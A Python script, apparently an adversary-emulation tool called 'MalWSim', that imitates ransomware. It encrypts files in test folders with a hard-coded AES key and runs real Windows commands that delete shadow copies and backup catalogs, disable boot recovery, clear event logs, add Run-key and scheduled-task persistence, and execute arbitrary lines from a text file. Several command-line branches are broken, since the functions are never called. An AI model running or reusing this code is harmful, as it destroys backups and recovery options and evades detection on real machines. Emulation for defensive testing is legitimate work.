import os
import sys
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
import pyfiglet


def create_setup():
    directory_name = "test_directory"
    file_name = "test_file"

    for i in range(1, 6):
        create_dir = directory_name + "_" + str(i)
        if not os.path.exists(create_dir):
            os.makedirs(create_dir)
            for j in range(1, 11):
                file_path = os.path.join(create_dir, f"{file_name}_{j}.txt")
                if not os.path.exists(file_path):
                    with open(file_path, "w") as f:
                        f.write("Random test data for ransomware simulator " + str(i) + " " + str(j))


dirs = "test_directory_"
file = "test_file"

key = b'\x2b\x7e\x15\x16\x28\xae\xd2\xa6\xab\xf7\x15\x88\x09\xcf\x4f\x3c'
iv = b'\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff'

def encrypt_file():
    for i in range(1,6):
        open_dirs = dirs + str(i)    
        for i in range(1,11):
            file_path = ".\\" + open_dirs + "\\" + file + "_" + str(i) + ".txt"
            try:
                with open(file_path, "rb") as f:
                    plaintext = f.read()
                    padder = padding.PKCS7(128).padder()
                    padded_data = padder.update(plaintext) + padder.finalize()

                    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
                    encryptor = cipher.encryptor()
                    ciphertext = encryptor.update(padded_data) + encryptor.finalize()

                    with open(file_path, "wb") as f:
                        f.write(ciphertext)
                new_file_path = file_path + ".encrypted"
                os.rename(file_path, new_file_path)

            except:
                continue

def help_func():
    pass


def shadow_copy_delete():
    os.system("vssadmin.exe delete shadows /all /quiet")
    os.system("wmic shadowcopy delete")
    os.system("wbadmin.exe delete catalog -quiet")
    pass

def boot_config_mod():
    os.system("bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no")
    pass

def autorun_modify():
    os.system('reg add HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v "MalWSim" /t REG_SZ /d "python C:\Windows\Temp\MalwSim.py" /f')
    pass

def schedule_task():
    os.system('schtasks /create /tn "MalWSim" /tr "python C:\Windows\Temp\MalwSim.py" /sc minute /mo 30')
    pass


def defender_disable():
    os.system('Set-MpPreference -DisableRealtimeMonitoring $false')
    pass

def log_clear_wevtutil():
    os.system('wevtutil el | Foreach-Object {wevtutil cl "$_"}')


def additional_commands(): #Loads cmds.txt file and execute command 
    try:
        with open("cmds.txt", "r") as f:

            # Iterate over each line of the file
            for line in f:

                # Execute each line as Python code
                print(os.system(line))
    except:
        pass

def help_func():
    print(pyfiglet.figlet_format('MalWSim'))
    options = """
    --shadow-del      Use To delete shadow copy
    --clear-log       Clear logs using wevtutil
    --disable-def     Disables Defender via Poweshell
    --bcd-modify      Modifies boot config data to disable auto recovery
    --autorun-modify  Places the scripts at Run registry
    --task-schedule   Schedules the script to be executed at every 30 min
    """
    return options

def runner(): # Handle user input here to execute various commands and function:
    if len(sys.argv) <= 1:
        print(help_func())

    for i in range(1,len(sys.argv)):
        if sys.argv[i] == "--shadow-del":
            shadow_copy_delete()
        if sys.argv[i] == "--clear-log":
            log_clear_wevtutil
        if sys.argv[i] == "--disable-def":
            defender_disable
        if sys.argv[i] == "--bcd-modify":
            boot_config_mod
        if sys.argv[i] == "--autorun-modify":
            autorun_modify
        if sys.argv[i] == "--task-schedule":
            schedule_task
        if sys.argv[i] == "--help" or sys.argv[i] == "-h":
            print(help_func())
        else:
            try:
                create_setup()
                encrypt_file()
            except:
                print("File and folder related error")

runner()
